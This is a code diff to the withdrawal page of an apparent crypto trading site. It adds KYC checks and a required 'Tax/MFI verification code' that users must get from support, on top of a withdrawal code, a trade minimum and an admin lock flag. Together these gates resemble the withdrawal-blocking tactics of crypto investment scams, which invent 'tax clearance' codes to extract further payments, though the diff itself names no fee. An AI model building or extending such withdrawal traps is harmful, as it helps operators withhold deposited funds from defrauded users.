@@ -6,8 +6,9 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { AlertCircle, CheckCircle2, Clock, XCircle, Lock, Wallet } from "lucide-react"
+import { AlertCircle, CheckCircle2, Clock, XCircle, Lock, Wallet, Shield, FileText } from "lucide-react"
 import { createClient } from "@/lib/supabase/client"
+import Link from "next/link"
 
 interface UserData {
     balance_deposit: number
@@ -17,6 +18,9 @@ interface UserData {
     completed_trades: number
     required_trades: number
     withdrawal_code?: string
+    kyc_status?: string
+    tax_code?: string
+    mfi_code?: string
 }
 
 interface Transaction {
@@ -36,6 +40,7 @@ export default function WithdrawalsPage() {
     const [amount, setAmount] = useState("")
     const [walletAddress, setWalletAddress] = useState("")
     const [withdrawalCode, setWithdrawalCode] = useState("")
+    const [taxCode, setTaxCode] = useState("")
     const [isSubmitting, setIsSubmitting] = useState(false)
     const [success, setSuccess] = useState(false)
     const [error, setError] = useState<string | null>(null)
@@ -59,7 +64,7 @@ export default function WithdrawalsPage() {
 
         const { data } = await supabase
             .from("users")
-            .select("balance_deposit, balance_profit, balance_bonus, can_withdraw, completed_trades, required_trades, withdrawal_code")
+            .select("balance_deposit, balance_profit, balance_bonus, can_withdraw, completed_trades, required_trades, withdrawal_code, kyc_status, tax_code, mfi_code")
             .eq("id", user.id)
             .single()
 
@@ -86,7 +91,10 @@ export default function WithdrawalsPage() {
         ? (userData.balance_deposit || 0) + (userData.balance_profit || 0) + (userData.balance_bonus || 0)
         : 0
 
-    const canWithdraw = userData?.can_withdraw !== false && (userData?.completed_trades || 0) >= 2
+    const kycApproved = userData?.kyc_status === 'approved'
+    const tradesCompleted = (userData?.completed_trades || 0) >= 2
+    const canWithdrawFlag = userData?.can_withdraw !== false
+    const canWithdraw = kycApproved && tradesCompleted && canWithdrawFlag
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
@@ -99,9 +107,19 @@ export default function WithdrawalsPage() {
             const { data: { user } } = await supabase.auth.getUser()
             if (!user) throw new Error("Please login to continue")
 
-            // Validate withdrawal eligibility
-            if (!canWithdraw) {
-                throw new Error("You are not eligible to withdraw. Please complete the required trades first.")
+            // Check KYC
+            if (!kycApproved) {
+                throw new Error("Please complete KYC verification before withdrawing.")
+            }
+
+            // Check trades
+            if (!tradesCompleted) {
+                throw new Error("You need to complete at least 2 trades before withdrawing.")
+            }
+
+            // Check withdraw flag
+            if (!canWithdrawFlag) {
+                throw new Error("Withdrawals are currently disabled on your account.")
             }
 
             const withdrawAmount = parseFloat(amount)
@@ -123,6 +141,11 @@ export default function WithdrawalsPage() {
                 throw new Error("Invalid withdrawal code")
             }
 
+            // Check tax/MFI code if required
+            if (userData?.tax_code && userData.tax_code !== taxCode) {
+                throw new Error("Invalid Tax/MFI code. Please enter the correct code to proceed.")
+            }
+
             // Create withdrawal request
             const { error: insertError } = await supabase.from("transactions").insert({
                 user_id: user.id,
@@ -139,6 +162,7 @@ export default function WithdrawalsPage() {
             setAmount("")
             setWalletAddress("")
             setWithdrawalCode("")
+            setTaxCode("")
             fetchWithdrawals()
 
         } catch (err: unknown) {
@@ -167,25 +191,68 @@ export default function WithdrawalsPage() {
                     <p className="mt-1 text-muted-foreground">Request a withdrawal to your crypto wallet</p>
                 </div>
 
-                {/* Eligibility Check */}
-                {!canWithdraw && (
+                {/* KYC Requirement Alert */}
+                {!kycApproved && (
+                    <Card className="border-blue-500/50 bg-blue-500/5">
+                        <CardContent className="flex items-start gap-3 p-4">
+                            <Shield className="h-5 w-5 flex-shrink-0 text-blue-500 mt-0.5" />
+                            <div className="flex-1">
+                                <p className="font-medium text-foreground">KYC Verification Required</p>
+                                <p className="text-sm text-muted-foreground mt-1">
+                                    You must complete identity verification (KYC) before you can withdraw funds.
+                                </p>
+                            </div>
+                            <Button size="sm" asChild>
+                                <Link href="/dashboard/kyc">Verify Now</Link>
+                            </Button>
+                        </CardContent>
+                    </Card>
+                )}
+
+                {/* Trade Requirement Alert */}
+                {kycApproved && !tradesCompleted && (
+                    <Card className="border-yellow-500/50 bg-yellow-500/5">
+                        <CardContent className="flex items-start gap-3 p-4">
+                            <Lock className="h-5 w-5 flex-shrink-0 text-yellow-500 mt-0.5" />
+                            <div>
+                                <p className="font-medium text-foreground">Trade Requirement</p>
+                                <p className="text-sm text-muted-foreground mt-1">
+                                    Complete at least 2 trades to unlock withdrawals.
+                                    <br />
+                                    <strong>Progress: {userData?.completed_trades || 0}/2 trades completed</strong>
+                                </p>
+                            </div>
+                        </CardContent>
+                    </Card>
+                )}
+
+                {/* Admin Restriction Alert */}
+                {kycApproved && tradesCompleted && !canWithdrawFlag && (
                     <Card className="border-destructive/50 bg-destructive/5">
                         <CardContent className="flex items-start gap-3 p-4">
                             <Lock className="h-5 w-5 flex-shrink-0 text-destructive mt-0.5" />
                             <div>
-                                <p className="font-medium text-foreground">Withdrawal Locked</p>
-                                {(userData?.completed_trades || 0) < 2 ? (
-                                    <p className="text-sm text-muted-foreground mt-1">
-                                        You need to complete at least 2 trades before you can withdraw.
-                                        <br />
-                                        <strong>Progress: {userData?.completed_trades || 0}/2 trades completed</strong>
-                                    </p>
-                                ) : (
-                                    <p className="text-sm text-muted-foreground mt-1">
-                                        Withdrawals have been disabled on your account by an administrator.
-                                        Please contact support for assistance.
-                                    </p>
-                                )}
+                                <p className="font-medium text-foreground">Withdrawal Restricted</p>
+                                <p className="text-sm text-muted-foreground mt-1">
+                                    Withdrawals have been disabled on your account by an administrator.
+                                    Please contact support for assistance.
+                                </p>
+                            </div>
+                        </CardContent>
+                    </Card>
+                )}
+
+                {/* Tax/MFI Code Info */}
+                {userData?.tax_code && (
+                    <Card className="border-orange-500/50 bg-orange-500/5">
+                        <CardContent className="flex items-start gap-3 p-4">
+                            <FileText className="h-5 w-5 flex-shrink-0 text-orange-500 mt-0.5" />
+                            <div>
+                                <p className="font-medium text-foreground">Tax/MFI Code Required</p>
+                                <p className="text-sm text-muted-foreground mt-1">
+                                    A tax clearance or MFI verification code is required for this withdrawal.
+                                    Please contact support if you haven't received your code.
+                                </p>
                             </div>
                         </CardContent>
                     </Card>
@@ -212,15 +279,15 @@ export default function WithdrawalsPage() {
                     </Card>
                 )}
 
-                {/* Balance Overview */}
-                <div className="grid gap-4 md:grid-cols-3">
+                {/* Status Overview */}
+                <div className="grid gap-4 md:grid-cols-4">
                     <Card>
                         <CardContent className="p-4">
                             <div className="flex items-center gap-3">
                                 <Wallet className="h-5 w-5 text-primary" />
                                 <div>
-                                    <p className="text-sm text-muted-foreground">Available Balance</p>
-                                    <p className="text-2xl font-bold text-foreground">${totalBalance.toFixed(2)}</p>
+                                    <p className="text-sm text-muted-foreground">Balance</p>
+                                    <p className="text-xl font-bold text-foreground">${totalBalance.toFixed(2)}</p>
                                 </div>
                             </div>
                         </CardContent>
@@ -228,10 +295,23 @@ export default function WithdrawalsPage() {
                     <Card>
                         <CardContent className="p-4">
                             <div className="flex items-center gap-3">
-                                <CheckCircle2 className="h-5 w-5 text-green-500" />
+                                <Shield className={`h-5 w-5 ${kycApproved ? 'text-green-500' : 'text-yellow-500'}`} />
                                 <div>
-                                    <p className="text-sm text-muted-foreground">Trades Completed</p>
-                                    <p className="text-2xl font-bold text-foreground">{userData?.completed_trades || 0}/2</p>
+                                    <p className="text-sm text-muted-foreground">KYC</p>
+                                    <p className={`text-lg font-bold ${kycApproved ? 'text-green-500' : 'text-yellow-500'}`}>
+                                        {kycApproved ? 'Verified' : 'Pending'}
+                                    </p>
+                                </div>
+                            </div>
+                        </CardContent>
+                    </Card>
+                    <Card>
+                        <CardContent className="p-4">
+                            <div className="flex items-center gap-3">
+                                <CheckCircle2 className={`h-5 w-5 ${tradesCompleted ? 'text-green-500' : 'text-yellow-500'}`} />
+                                <div>
+                                    <p className="text-sm text-muted-foreground">Trades</p>
+                                    <p className="text-lg font-bold text-foreground">{userData?.completed_trades || 0}/2</p>
                                 </div>
                             </div>
                         </CardContent>
@@ -245,7 +325,7 @@ export default function WithdrawalsPage() {
                                     <Lock className="h-5 w-5 text-destructive" />
                                 )}
                                 <div>
-                                    <p className="text-sm text-muted-foreground">Withdrawal Status</p>
+                                    <p className="text-sm text-muted-foreground">Status</p>
                                     <p className={`text-lg font-bold ${canWithdraw ? 'text-green-500' : 'text-destructive'}`}>
                                         {canWithdraw ? 'Unlocked' : 'Locked'}
                                     </p>
@@ -323,19 +403,39 @@ export default function WithdrawalsPage() {
                                         disabled={!canWithdraw}
                                         required
                                     />
+                                </div>
+                            )}
+
+                            {userData?.tax_code && (
+                                <div className="space-y-2">
+                                    <Label htmlFor="taxCode">Tax/MFI Verification Code</Label>
+                                    <Input
+                                        id="taxCode"
+                                        placeholder="Enter your Tax/MFI code"
+                                        value={taxCode}
+                                        onChange={(e) => setTaxCode(e.target.value)}
+                                        disabled={!canWithdraw}
+                                        required
+                                    />
                                     <p className="text-xs text-muted-foreground">
-                                        A withdrawal code has been set on your account. Contact support if you don't have it.
+                                        Enter the tax clearance or MFI code provided to you. Contact support if you need assistance.
                                     </p>
                                 </div>
                             )}
 
                             <div className="space-y-2 bg-muted/50 p-4 rounded-lg">
-                                <p className="text-sm font-medium text-foreground">Withdrawal Information:</p>
+                                <p className="text-sm font-medium text-foreground">Withdrawal Requirements:</p>
                                 <ul className="space-y-1 text-sm text-muted-foreground">
+                                    <li className="flex items-center gap-2">
+                                        {kycApproved ? <CheckCircle2 className="h-3 w-3 text-green-500" /> : <XCircle className="h-3 w-3 text-destructive" />}
+                                        KYC Verification
+                                    </li>
+                                    <li className="flex items-center gap-2">
+                                        {tradesCompleted ? <CheckCircle2 className="h-3 w-3 text-green-500" /> : <XCircle className="h-3 w-3 text-destructive" />}
+                                        Minimum 2 trades completed
+                                    </li>
                                     <li>• Minimum withdrawal: <strong>$50</strong></li>
                                     <li>• Processing time: <strong>24-48 hours</strong></li>
-                                    <li>• Network fees may apply</li>
-                                    <li>• Ensure your wallet address is correct</li>
                                 </ul>
                             </div>
 
